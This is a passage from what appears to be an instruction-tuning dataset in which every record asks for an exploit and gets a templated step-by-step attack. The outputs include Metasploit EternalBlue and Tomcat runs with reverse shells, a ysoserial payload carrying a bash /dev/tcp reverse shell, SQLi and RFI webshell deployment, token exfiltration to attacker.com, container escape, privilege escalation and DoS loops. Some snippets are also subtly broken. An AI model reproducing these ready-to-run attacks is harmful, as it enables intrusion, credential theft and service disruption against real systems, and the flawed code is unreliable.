    "output": "Step 1️⃣ — Identify Vulnerability\nStored XSS persists malicious script, executing on admin views for theft or actions.\n\nStep 2️⃣ — Craft Payload\nInject script to alert or exfil data when admin views profiles.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X POST https://social.com/profile -H 'Authorization: Bearer <TOKEN>' -d 'bio=<script>alert(\"Admin viewed profile\")</script>'\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the Apache Tomcat manager RCE.",
    "input": "Scan on https://tomcat.com:8080: Tomcat 8.5.0 with manager app deployed, default creds tomcat/tomcat vulnerable to war upload.",
    "output": "Step 1️⃣ — Identify Vulnerability\nExposed manager GUI allows war deployment for RCE with weak creds.\n\nStep 2️⃣ — Configure Module\nUse the tomcat_mgr_upload module with creds for shell.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use exploit/multi/http/tomcat_mgr_upload; set RHOSTS tomcat.com; set RPORT 8080; set USERNAME tomcat; set PASSWORD tomcat; set LHOST <YOUR_IP>; set PAYLOAD java/jsp_shell_reverse_tcp; exploit\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit the broken authentication in API rate limiting for DoS.",
    "input": "Finding: API at https://api.com/v1/data has per-IP limit 100/min but no auth, allowing unlimited from proxies.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnauth rate limits are IP-based, bypassable with proxies for DoS.\n\nStep 2️⃣ — Rotate Proxies\nUse proxy list to flood endpoints.\n\nStep 3️⃣ — Execute Attack\n```bash\nproxies=(proxy1:port proxy2:port)\nfor proxy in \"${proxies[@]}\"; do curl -x $proxy https://api.com/v1/data -H 'X-Forwarded-For: 127.0.0.1' & done\n# Or with tor: torsocks curl https://api.com/v1/data\n```"
  },
  {
    "instruction": "Generate the sqlmap command to exploit the cookie-based SQL injection for session hijack.",
    "input": "Finding: SQLi in 'user_id' cookie at https://session.com/home, MySQL backend.",
    "output": "Step 1️⃣ — Identify Vulnerability\nCookie SQLi allows manipulating session data via injection in cookie value.\n\nStep 2️⃣ — Formulate sqlmap\nTarget cookie param for user enum and dump.\n\nStep 3️⃣ — Execute Attack\n```bash\nsqlmap -u \"https://session.com/home\" --cookie=\"user_id=1;session=abc\" -p user_id --dbms=mysql --dump -D users -T sessions --threads=1\n```"
  },
  {
    "instruction": "Provide the Python script to exploit the side-channel timing attack on login.",
    "input": "Finding: Login at https://bank.com/login delays on wrong password but not username, allowing user enum.",
    "output": "Step 1️⃣ — Identify Vulnerability\nTiming differences reveal valid usernames via response time.\n\nStep 2️⃣ — Measure Delays\nScript to time requests for user list.\n\nStep 3️⃣ — Execute Attack\n```python\nimport requests, time\nusers = ['admin', 'manager', 'user1']\nfor u in users:\n    start = time.time()\n    requests.post('https://bank.com/login', data={'user': u, 'pass': 'wrong'})\n    if time.time() - start > 0.05:\n        print(f'Valid: {u}')\n```"
  },
  {
    "instruction": "Generate the command to exploit the exposed .DS_Store file for directory enum.",
    "input": "Finding: /.DS_Store at http://macserver.com/.DS_Store lists files like /private/config.ini.",
    "output": "Step 1️⃣ — Identify Vulnerability\nExposed .DS_Store reveals filesystem structure for targeted attacks.\n\nStep 2️⃣ — Parse and Download\nDownload and extract paths, then fetch files.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl http://macserver.com/.DS_Store -o dsstore\npython3 -c 'import DS_Store; ds = DS_Store.DSStore(\"dsstore\"); for entry in ds: print(entry[0])'\n# Download: curl http://macserver.com/private/config.ini -o config\n```"
  },
  {
    "instruction": "Provide the curl commands to exploit the insecure deserialization in JSON for param tampering.",
    "input": "Finding: Update at https://app.com/update deserializes JSON with __type__: 'admin', allowing role change.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnsafe JSON deserialization permits type confusion for privilege escalation.\n\nStep 2️⃣ — Tamper Type\nSet __type__ to admin in payload.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X POST https://app.com/update -H 'Content-Type: application/json' -d '{\"__type__\":\"admin\",\"role\":\"superuser\"}'\n```"
  },
  {
    "instruction": "Generate a two-step chain using RCE to mount NFS share for data exfil.",
    "input": "Finding 1: RCE in /exec?cmd=id at http://server.com/exec. Finding 2: NFS export /data rw to attacker IP.",
    "output": "Step 1️⃣ — Gain RCE\nExecute commands via param for shell access.\n\nStep 2️⃣ — Mount and Exfil\nFrom RCE, mount NFS and copy files.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'http://server.com/exec?cmd=mount -t nfs <YOUR_IP>:/mnt /tmp/nfs'\ncurl 'http://server.com/exec?cmd=cp -r /data/* /tmp/nfs/'\n```"
  },
  {
    "instruction": "Assuming shell, provide commands to exploit the weak umask for file permission escalation.",
    "input": "Enum: App creates files with umask 000, world-readable/writable, allowing overwrite of configs.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nWeak umask exposes new files to tampering by other users.\n\nStep 2️⃣ — Overwrite Config\nWait for app to create file, then modify before read.\n\nStep 3️⃣ — Execute Attack\n```bash\n# Race: while true; do if [ -f /tmp/app_config ]; then echo 'debug=true' > /tmp/app_config; break; fi; done &\n# App creates, overwritten\n```"
  },
  {
    "instruction": "Generate the command to exploit the weak symmetric encryption for data decryption.",
    "input": "Finding: Encrypted data in DB uses ECB mode AES with key 'weakkey123456', no IV, allowing block replay attacks.",
    "output": "Step 1️⃣ — Identify Vulnerability\nECB mode leaks patterns and allows cut-paste attacks on encrypted data.\n\nStep 2️⃣ — Decrypt or Replay\nExtract ciphertext, decrypt with key or swap blocks for privilege escalation.\n\nStep 3️⃣ — Execute Attack\nUse Python to decrypt (assuming dumped cipher):\n```python\nfrom Crypto.Cipher import AES\nimport base64\nkey = b'weakkey123456'\nciphertext = base64.b64decode('<DUMPED_CIPHER>')\ncipher = AES.new(key, AES.MODE_ECB)\npt = unpad(cipher.decrypt(ciphertext), AES.block_size)\nprint(pt.decode())\n```"
  },
  {
    "instruction": "Provide the curl command sequence to exploit missing rate limiting on login for brute-force.",
    "input": "Finding: Login endpoint at https://api.com/auth/login allows unlimited attempts, no CAPTCHA.",
    "output": "Step 1️⃣ — Identify Vulnerability\nNo rate limits enable exhaustive brute-force on credentials.\n\nStep 2️⃣ — Automate Attacks\nUse curl with wordlist, check for success indicators.\n\nStep 3️⃣ — Execute Attack\n```bash\nwhile read pass; do curl -s -X POST https://api.com/auth/login -d \"username=admin&password=$pass\" | grep -q 'success' && echo \"Cracked: $pass\" && break; done < passwords.txt\n```"
  },
  {
    "instruction": "Generate the ysoserial command for Java RCE via Jackson deserialization.",
    "input": "Finding: JSON POST at https://javaapp.com/parse uses Jackson ObjectMapper without @JsonTypeInfo, vulnerable to polymorphic typing.",
    "output": "Step 1️⃣ — Identify Vulnerability\nJackson deserialization allows gadget chains for code execution via type param.\n\nStep 2️⃣ — Generate Payload\nUse ysoserial with Jackson gadget for command exec.\n\nStep 3️⃣ — Execute Attack\nListener: `nc -lvnp 9999`.\n```bash\njava -jar ysoserial.jar Jackson1 'bash -i >& /dev/tcp/<YOUR_IP>/9999 0>&1' > payload.json\ncurl -X POST --data-binary @payload.json -H 'Content-Type: application/json' https://javaapp.com/parse\n```"
  },
  {
    "instruction": "Provide the steps and curl command to exploit business logic flaw in discount stacking.",
    "input": "Finding: Checkout at https://shop.com/checkout applies multiple coupons without limit check, e.g., 50% + 50% = 100% off.",
    "output": "Step 1️⃣ — Identify Vulnerability\nLogic flaw allows stacking discounts for free items.\n\nStep 2️⃣ — Stack Coupons\nAdd multiple valid coupons in cart params.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X POST https://shop.com/checkout -d 'cart_id=123&coupons[]=DISC50&coupons[]=DISC50' -b 'session=<ID>'\n```"
  },
  {
    "instruction": "Generate the command to exploit sensitive data exposure in API response headers.",
    "input": "Finding: API at https://api.com/user returns X-Debug: DB_PASSWORD=secret in headers on error.",
    "output": "Step 1️⃣ — Identify Vulnerability\nExposed headers leak secrets on fault conditions.\n\nStep 2️⃣ — Trigger Error\nSend invalid request to elicit debug header.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -H 'Invalid-Header: ' https://api.com/user -v 2>&1 | grep -i password\n```"
  },
  {
    "instruction": "Provide the AWS CLI commands to exploit public S3 bucket for data theft.",
    "input": "Finding: S3 bucket 'dev-backup-2025' at s3://dev-backup-2025.s3.amazonaws.com is public, contains /configs/db_creds.txt.",
    "output": "Step 1️⃣ — Identify Vulnerability\nPublic ACL on S3 exposes all objects anonymously.\n\nStep 2️⃣ — List and Download\nUse AWS CLI anonymously to enumerate and steal.\n\nStep 3️⃣ — Execute Attack\n```bash\naws s3 ls s3://dev-backup-2025/ --no-sign-request\naws s3 cp s3://dev-backup-2025/configs/db_creds.txt . --no-sign-request\n```"
  },
  {
    "instruction": "Generate the curl command to exploit known vuln in jQuery for XSS.",
    "input": "Finding: Site https://jsapp.com uses jQuery 1.9.0 vulnerable to CVE-2020-11022, allowing DOM XSS via html() on untrusted input.",
    "output": "Step 1️⃣ — Identify Vulnerability\nOld jQuery parses script tags in html(), enabling XSS.\n\nStep 2️⃣ — Craft Payload\nInject <img src=x onerror=alert(1)> via param reflected in html().\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'https://jsapp.com/page?content=<img src=x onerror=alert(document.cookie)>'\n```"
  },
  {
    "instruction": "Provide the commands to exploit lack of logging for undetected persistence.",
    "input": "Finding: No audit logs on /admin at https://admin.com/admin, allows adding backdoor user without trace.",
    "output": "Step 1️⃣ — Identify Vulnerability\nMissing logs enable stealthy modifications.\n\nStep 2️⃣ — Add Persistence\nCreate hidden admin user via unauth endpoint.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X POST https://admin.com/admin/users -d 'user=backdoor&role=admin&pass=secret' --silent\n# No log entry, persistent access\n```"
  },
  {
    "instruction": "Generate the curl command to exploit XXE in SOAP request for DTD external entity.",
    "input": "Finding: SOAP at https://soap.com/service accepts XML with external DTD, resolves file:///etc/hosts.",
    "output": "Step 1️⃣ — Identify Vulnerability\nXXE parses external entities, disclosing local files.\n\nStep 2️⃣ — Define Entity\nUse <!ENTITY> to read file in response.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X POST https://soap.com/service -H 'Content-Type: text/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><soap:Envelope><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>'\n```"
  },
  {
    "instruction": "Provide the command to exploit server-side template injection in email template.",
    "input": "Finding: Email preview at https://mail.com/preview?template={{7*7}} executes Jinja2, vulnerable to SSTI for RCE.",
    "output": "Step 1️⃣ — Identify Vulnerability\nSSTI in templates allows code execution via expressions.\n\nStep 2️⃣ — Craft Payload\nUse {{config.__class__.__init__.__globals__['os'].popen('id').read()}} for command.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'https://mail.com/preview?template={{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}}'\n```"
  },
  {
    "instruction": "Generate the command to exploit the insecure use of eval() in JavaScript for client-side RCE.",
    "input": "Finding: Client JS at https://jsapp.com/main.js uses eval(userInput) from URL param 'calc', allowing arbitrary JS execution in browser.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnsafe eval executes user-controlled code client-side, leading to DOM manipulation or data theft.\n\nStep 2️⃣ — Craft Payload\nInject JS to steal localStorage or cookies and send to attacker.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'https://jsapp.com/?calc=fetch(\"http://attacker.com/steal?data=\"+btoa(localStorage.getItem(\"token\")))'\n# Or direct: Open URL in browser with ?calc=alert(document.cookie)\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the HTTP header injection for response splitting.",
    "input": "Finding: Search at https://search.com/q=test injects User-Agent into response headers, allowing CRLF for splitting.",
    "output": "Step 1️⃣ — Identify Vulnerability\nHeader injection with CRLF enables response splitting for cache poisoning or XSS.\n\nStep 2️⃣ — Craft Split\nInject \r\nSet-Cookie: session=admin to add malicious header.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -A 'test\r\nSet-Cookie: session=attacker; Path=/\r\n' https://search.com/q=split\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the Cisco ISE CLI RCE.",
    "input": "Scan on ise.cisco.com: Cisco ISE 2.6 vulnerable to CVE-2019-1763, unauth RCE via crafted HTTP request to CLI endpoint.",
    "output": "Step 1️⃣ — Identify Vulnerability\nISE CLI exposure allows command injection for system compromise.\n\nStep 2️⃣ — Configure Module\nUse the HTTP module for payload delivery.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use exploit/linux/http/cisco_ise_cli_rce; set RHOSTS ise.cisco.com; set RPORT 443; set SSL true; set LHOST <YOUR_IP>; set PAYLOAD cmd/unix/reverse; exploit\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit the improper certificate validation in gRPC for MITM.",
    "input": "Finding: gRPC client at grpc.example.com skips hostname verification, allowing fake certs for interception.",
    "output": "Step 1️⃣ — Identify Vulnerability\nDisabled hostname check enables MITM with self-signed certs.\n\nStep 2️⃣ — Set Up Fake Server\nUse grpcurl with insecure flag to proxy traffic.\n\nStep 3️⃣ — Execute Attack\n```bash\ngrpcurl -insecure -d '{\"method\":\"call\"}' grpc.example.com:443 list\n# MITM: mitmproxy --set grpc=true -p 10000; client --grpc-hostname skip\n```"
  },
  {
    "instruction": "Generate the sqlmap command to exploit the POST-based SQL injection for blind extraction.",
    "input": "Finding: Blind SQLi in 'email' POST param at https://newsletter.com/subscribe, Oracle backend.",
    "output": "Step 1️⃣ — Identify Vulnerability\nBlind POST SQLi requires inference via conditions for data extraction.\n\nStep 2️⃣ — Formulate sqlmap\nUse --data for POST, --technique=B for blind.\n\nStep 3️⃣ — Execute Attack\n```bash\nsqlmap -u \"https://newsletter.com/subscribe\" --data=\"email=test@test.com&name=foo\" -p email --dbms=oracle --technique=B --dump -D users\n```"
  },
  {
    "instruction": "Provide the Python script to exploit the insecure random in nonce for replay attack.",
    "input": "Finding: API at https://secure.com/transaction uses nonce= timestamp % 1000, predictable and reusable for replay.",
    "output": "Step 1️⃣ — Identify Vulnerability\nPredictable nonce allows capturing and replaying signed requests.\n\nStep 2️⃣ — Capture and Replay\nSniff a valid tx, reuse with same nonce.\n\nStep 3️⃣ — Execute Attack\n```python\nimport requests, time\n# Capture: r = requests.post('https://secure.com/transaction', json={'nonce': int(time.time())%1000, 'action': 'transfer'})\n# Replay with same payload\nrequests.post('https://secure.com/transaction', json=r.json())  # Reuses nonce\n```"
  },
  {
    "instruction": "Generate the command to exploit the exposed actuator endpoints in Spring Boot for env dump.",
    "input": "Finding: Spring Boot at https://bootapp.com/actuator/env exposes environment variables including secrets.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnauth actuator endpoints leak sensitive config like passwords.\n\nStep 2️⃣ — Query Endpoints\nGET /actuator/env to dump all properties.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl https://bootapp.com/actuator/env | jq '.propertySources[] | select(.name==\"systemProperties\") | .properties | to_entries[] | select(.key|contains(\"password\"))'\n```"
  },
  {
    "instruction": "Provide the curl commands to exploit the insecure CORS with credentials for data theft.",
    "input": "Finding: API https://cors.com/data has CORS * with credentials: true, allowing read from malicious origin.",
    "output": "Step 1️⃣ — Identify Vulnerability\nPermissive CORS with creds exposes API to cross-site reads.\n\nStep 2️⃣ — Fetch from Malicious Site\nUse JS fetch with credentials from evil.com.\n\nStep 3️⃣ — Execute Attack\nHost JS: `fetch('https://cors.com/data', {credentials: 'include'}).then(r=>r.text()).then(console.log)`\nTest: ```bash\ncurl -H 'Origin: https://evil.com' --cookie 'session=valid' https://cors.com/data -H 'Access-Control-Request-Method: GET'\n```"
  },
  {
    "instruction": "Generate a two-step chain using file inclusion to RFI for webshell deployment.",
    "input": "Finding 1: LFI in /include?file=header.php. Finding 2: allow_url_fopen=On, allowing php://filter wrappers.",
    "output": "Step 1️⃣ — Read Remote Config\nUse RFI to include attacker-hosted shell.\n\nStep 2️⃣ — Deploy Shell\nInclude URL with PHP code for execution.\n\nStep 3️⃣ — Execute Attack\nHost shell on attacker.com:\n```bash\ncurl 'http://target.com/include?file=http://attacker.com/shell.txt'\n# shell.txt: <?php system($_GET['cmd']); ?>\n```"
  },
  {
    "instruction": "Assuming shell, provide commands to exploit the NFS root squash misconfig for priv esc.",
    "input": "Enum: NFS share /export mounted rw, no root squash, allowing root-owned file overwrite from low-priv.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nNo root squash treats remote root as local root for writes.\n\nStep 2️⃣ — Overwrite SUID\nMount share, copy SUID binary to overwrite /bin/su.\n\nStep 3️⃣ — Execute Attack\n```bash\nmount -t nfs target:/export /mnt\ncp /bin/su /mnt/su\n# On target: umount /export; mount /export  # Triggers overwrite\nsu root\n```"
  },
  {
    "instruction": "Generate the command to exploit NoSQL injection in MongoDB query for unauthorized data access.",
    "input": "Finding: MongoDB query at https://api.com/users/find?filter={\"email\":\"test@test.com\"} unsafely parses JSON, allowing $ne for bypass.",
    "output": "Step 1️⃣ — Identify Vulnerability\nNoSQL injection via unescaped JSON allows operator injection like $ne to match all users.\n\nStep 2️⃣ — Craft Injection\nReplace filter with {\"email\":{\"$ne\":null}} to dump all emails.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'https://api.com/users/find?filter={\"email\":{\"$ne\":null}}' | jq '.users[].email'\n```"
  },
  {
    "instruction": "Provide the curl command to exploit CSRF on JSON-only endpoint lacking token.",
    "input": "Finding: JSON API at https://jsonapi.com/account/update accepts POST without CSRF, changes email.",
    "output": "Step 1️⃣ — Identify Vulnerability\nJSON endpoints without CSRF tokens allow cross-site updates via forms.\n\nStep 2️⃣ — Craft CSRF Form\nHTML form auto-submits malicious JSON.\n\nStep 3️⃣ — Execute Attack\nHost HTML:\n```html\n<form action='https://jsonapi.com/account/update' method='POST' enctype='text/plain'><input name='{\"email\":\"attacker@evil.com\"}'><script>document.forms[0].submit();</script></form>\n```\nOr curl test: ```bash\ncurl -X POST https://jsonapi.com/account/update -H 'Content-Type: text/plain' -d '{\"email\":\"attacker@evil.com\"}' -b 'session=<VICTIM>'\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the WannaCry EternalBlue vulnerability.",
    "input": "Nmap on 192.168.1.50: Port 445 SMBv1 vulnerable to MS17-010 EternalBlue.",
    "output": "Step 1️⃣ — Identify Vulnerability\nEternalBlue exploits SMBv1 for unauth RCE on Windows, spreading like WannaCry.\n\nStep 2️⃣ — Formulate Exploit\nUse the EternalBlue module with meterpreter payload.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.50; set LHOST <YOUR_IP>; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit LFI via /proc/self/environ for RCE.",
    "input": "Finding: LFI in /view.php?file=index.php, server uses Apache with User-Agent in env, /proc/self/environ readable.",
    "output": "Step 1️⃣ — Identify Vulnerability\nLFI on /proc/self/environ exposes env vars, injectable via User-Agent for PHP code.\n\nStep 2️⃣ — Inject PHP\nSet User-Agent to PHP code, include environ.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -A '<?php system($_GET[\"cmd\"]); ?>' 'http://target.com/view.php?file=/proc/self/environ'\ncurl 'http://target.com/view.php?file=/proc/self/environ&cmd=id'\n```"
  },
  {
    "instruction": "Generate the curl command to exploit IDOR in GraphQL mutation.",
    "input": "Finding: GraphQL at https://graphql.com/graphql mutation updateUser(id: \"123\", role: \"admin\") lacks auth check on id.",
    "output": "Step 1️⃣ — Identify Vulnerability\nIDOR in GraphQL allows updating any user's role by changing id.\n\nStep 2️⃣ — Craft Mutation\nSet id to target user in variables.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X POST https://graphql.com/graphql -H 'Content-Type: application/json' -d '{\"query\":\"mutation {updateUser(id: \\\"456\\\", role: \\\"admin\\\") {id}}\", \"variables\":{}}'\n```"
  },
  {
    "instruction": "Provide the steps and command to exploit OAuth state parameter confusion for CSRF.",
    "input": "Finding: OAuth at https://oauth.com/authorize?state=abc ignores state validation, allowing state=evil to bypass origin checks.",
    "output": "Step 1️⃣ — Identify Vulnerability\nMissing state check enables CSRF in OAuth flow by forging state.\n\nStep 2️⃣ — Forge State\nSet state to attacker value, capture code on redirect.\n\nStep 3️⃣ — Execute Attack\nPhish: ```bash\ncurl 'https://oauth.com/authorize?client_id=app&redirect_uri=https://attacker.com/cb&state=evil&response_type=code'\n# Exchange code for token at attacker.com\n```"
  },
  {
    "instruction": "Generate the command sequence for buffer overflow exploitation using gdb.",
    "input": "Finding: Custom binary /app/buffer on target vulnerable to stack overflow with input > 64 bytes, no ASLR.",
    "output": "Step 1️⃣ — Identify Vulnerability\nBuffer overflow overwrites return address for control hijack.\n\nStep 2️⃣ — Find Offset and ROP\nUse cyclic, gdb to locate offset, ROP for shell.\n\nStep 3️⃣ — Execute Attack\n```bash\n# Offset: gdb ./app; (gdb) r < $(python3 -c 'from pwn import cyclic; print(cyclic(100))')\n# Payload: python3 -c 'print(\"A\"*offset + p64(elf.symbols[\"system\"]) + p64(0xdeadbeef) + p64(elf.search(\"/bin/sh\").next()))' | ./app\n```"
  },
  {
    "instruction": "Provide the commands to exploit misconfigured Redis for module loading RCE.",
    "input": "Finding: Redis 6.0 on redis://127.0.0.1:6379 no auth, module.load allowed.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnauth Redis with module.load enables loading malicious .so for RCE.\n\nStep 2️⃣ — Load Malicious Module\nHost .so with shellcode, load via redis-cli.\n\nStep 3️⃣ — Execute Attack\nCompile shell.so, then:\n```bash\nredis-cli -h 127.0.0.1 MODULE LOAD http://attacker.com/shell.so\n# Triggers shellcode\n```"
  },
  {
    "instruction": "Generate the curl command to exploit the insecure WebSocket handshake for origin bypass.",
    "input": "Finding: WebSocket at wss://ws.com/chat requires Origin: https://app.com, but accepts any with weak check.",
    "output": "Step 1️⃣ — Identify Vulnerability\nWeak Origin validation in WS handshake allows cross-origin connection.\n\nStep 2️⃣ — Connect with Forged Origin\nSet Origin header to bypass and send messages.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -i -N -H \"Origin: https://evil.com\" -H \"Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==\" -H \"Sec-WebSocket-Version: 13\" -H \"Connection: Upgrade\" -H \"Upgrade: websocket\" https://ws.com/chat\n```"
  },
  {
    "instruction": "Provide the command to exploit the tainted variable in PHP for arbitrary file write.",
    "input": "Finding: PHP script /write.php?path=uploads/file.txt writes user-controlled content to path, no sanitization.",
    "output": "Step 1️⃣ — Identify Vulnerability\nTainted path allows writing to arbitrary locations like /etc/hosts.\n\nStep 2️⃣ — Write Malicious File\nSet path to sensitive file with shell content.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'http://phpapp.com/write.php?path=../../../../etc/hosts&content=127.0.0.1 bad.com'\n```"
  },
  {
    "instruction": "Generate the command to exploit the insecure use of MD5 for password hashing.",
    "input": "Finding: Passwords in DB hashed with unsalted MD5, dumped from /var/www/db/users.db.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnsalted MD5 is fast and collision-prone, allowing rainbow table cracks.\n\nStep 2️⃣ — Crack Hashes\nUse hashcat with precomputed tables or wordlist.\n\nStep 3️⃣ — Execute Attack\nSave hashes to md5.txt, run:\n```bash\nhashcat -m 0 -a 0 md5.txt rockyou.txt --force\njohn --format=Raw-MD5 md5.txt --wordlist=rockyou.txt\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the open GraphQL introspection for schema leak.",
    "input": "Finding: GraphQL at https://api.com/graphql responds to __schema query with full types and mutations.",
    "output": "Step 1️⃣ — Identify Vulnerability\nIntrospection exposes API structure, aiding targeted attacks.\n\nStep 2️⃣ — Query Schema\nPOST introspection query to map fields.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X POST https://api.com/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name fields{name args{name type{name}}}}}}\"}'\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the Elasticsearch script injection RCE.",
    "input": "Scan on 192.168.2.10:9200: Elasticsearch 5.6.16 vulnerable to CVE-2015-1427, script query injection for OS command.",
    "output": "Step 1️⃣ — Identify Vulnerability\nES script query allows Groovy sandbox escape for RCE.\n\nStep 2️⃣ — Formulate Module\nUse the ES module to inject payload.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use exploit/multi/elasticsearch/script_update_prepare_rce; set RHOSTS 192.168.2.10; set RPORT 9200; set CMD 'id'; run\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit the weak file permissions on SSH keys for access.",
    "input": "Finding: ~/.ssh/id_rsa on shared server has 777 perms, readable by all users.",
    "output": "Step 1️⃣ — Identify Vulnerability\nOverly permissive SSH keys allow unauthorized use by other users.\n\nStep 2️⃣ — Copy and Use Key\nCat key, use for SSH to target hosts.\n\nStep 3️⃣ — Execute Attack\n```bash\ncp ~user/.ssh/id_rsa ~/.ssh/attacker_key\nssh -i ~/.ssh/attacker_key user@remote.host\n```"
  },
  {
    "instruction": "Generate the curl command to exploit the path traversal in image proxy.",
    "input": "Finding: Image proxy at https://proxy.com/img?path=images/cat.jpg allows ../ to /etc/passwd.",
    "output": "Step 1️⃣ — Identify Vulnerability\nTraversal in path param exposes server files via proxy.\n\nStep 2️⃣ — Traverse to File\nUse ../../../ to reach system files.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'https://proxy.com/img?path=../../../etc/passwd'\n```"
  },
  {
    "instruction": "Provide the Python script to exploit the insecure cookie signing for tampering.",
    "input": "Finding: Cookie signed with HMAC-SHA1 key 'weaksecret', allowing value modification if key known.",
    "output": "Step 1️⃣ — Identify Vulnerability\nWeak signing allows forging cookies for session escalation.\n\nStep 2️⃣ — Resign Cookie\nModify value, recompute signature.\n\nStep 3️⃣ — Execute Attack\n```python\nimport hmac, hashlib\nkey = b'weaksecret'\nvalue = b'role=admin'\nsig = hmac.new(key, value, hashlib.sha1).hexdigest()\ncookie = f'value={value.decode()}; sig={sig}'\nprint(cookie)\n# Use: requests.get('https://app.com', cookies=dict(c.split('=') for c in cookie.split(';')))\n```"
  },
  {
    "instruction": "Generate the command to exploit the exposed Docker socket for container escape.",
    "input": "Finding: Docker socket /var/run/docker.sock mounted in container, writable.",
    "output": "Step 1️⃣ — Identify Vulnerability\nMounted socket allows creating privileged containers for host access.\n\nStep 2️⃣ — Create Priv Container\nUse curl to API for new container with host mount.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X POST http://localhost:2375/containers/create -d '{\"Image\":\"alpine\",\"HostConfig\":{\"Privileged\":true,\"Binds\":[\"/:/host\"]},\"Cmd\":[\"chroot\",\"/host\",\"sh\"]}'\ncurl -X POST http://localhost:2375/containers/<ID>/start\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the prototype pollution in lodash for DoS.",
    "input": "Finding: App at https://lodashapp.com/merge uses _.merge on user input, polluting constructor.prototype.toString.",
    "output": "Step 1️⃣ — Identify Vulnerability\nLodash pollution overwrites prototypes, crashing on toString calls.\n\nStep 2️⃣ — Pollute Prototype\nSet __proto__ to null or invalid for crash.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X POST https://lodashapp.com/merge -H 'Content-Type: application/json' -d '{\"__proto__\":{\"toString\":null}}'\n```"
  },
  {
    "instruction": "Generate a two-step chain using SQLi to extract file via INTO OUTFILE.",
    "input": "Finding 1: SQLi in 'name' at http://db.com/insert. Finding 2: MySQL with FILE privilege, dir /var/www writable.",
    "output": "Step 1️⃣ — Confirm SQLi\nInject ' OR 1=1-- for dump.\n\nStep 2️⃣ — Write Webshell\nUse INTO OUTFILE to write shell.php.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'http://db.com/insert?name=admin\\' UNION SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/shell.php'--'\ncurl 'http://db.com/shell.php?c=id'\n```"
  },
  {
    "instruction": "Assuming shell, provide commands to exploit the LD_PRELOAD in sudo for priv esc.",
    "input": "Enum: Sudo allows /usr/bin/env as root, LD_PRELOAD env var injectable.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nLD_PRELOAD in sudo env loads shared lib before others for hijack.\n\nStep 2️⃣ — Create Malicious Lib\nCompile .so that spawns shell in init.\n\nStep 3️⃣ — Execute Attack\n```bash\n# lib.c: #include <stdio.h>; void init(){setuid(0);system(\"/bin/sh\");}\ngcc -shared -fPIC -o /tmp/lib.so lib.c\necho 'LD_PRELOAD=/tmp/lib.so' sudo /usr/bin/env\n```"
  },
  {
    "instruction": "Generate the command to exploit the insecure JWT with kid header injection.",
    "input": "Finding: JWT at Authorization: Bearer uses kid: \"admin\" for SQLi in lookup, allowing auth bypass.",
    "output": "Step 1️⃣ — Identify Vulnerability\nkid header injection treats value as SQL query, extracting admin token via UNION.\n\nStep 2️⃣ — Craft Malicious Header\nSet kid to ' UNION SELECT admin_token FROM users-- for token dump.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -H 'Authorization: Bearer <BASE_TOKEN>' -H 'Content-Type: application/json' -X POST https://jwtapp.com/validate -d '{}' -v | grep -o 'eyJ[^']*'\n# Use dumped admin token\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the HTTP/2 rapid reset for DoS.",
    "input": "Finding: Server at https://h2server.com supports HTTP/2, vulnerable to CVE-2023-44487 rapid reset attack.",
